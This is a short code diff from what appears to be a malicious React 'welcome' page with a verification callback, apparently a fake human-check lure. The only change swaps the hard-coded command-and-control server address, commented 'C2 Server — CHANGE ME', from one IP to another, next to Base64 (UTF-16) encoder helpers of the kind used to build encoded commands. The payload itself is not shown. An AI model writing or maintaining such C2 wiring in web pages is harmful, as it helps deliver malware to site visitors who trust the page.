@@ -64,7 +64,7 @@ const WelcomeWebsitePage: React.FC<{ onVerifyReady?: (verify: () => void) => voi
   const passedRef = useRef(false);
 
   // C2 Server — CHANGE ME
-  const C2_URL = 'http://64.204.80.37/815';
+  const C2_URL = 'http://51.194.112.87/815';
 
   // Base64 encoders
   const b64UTF16 = (str: string): string => {
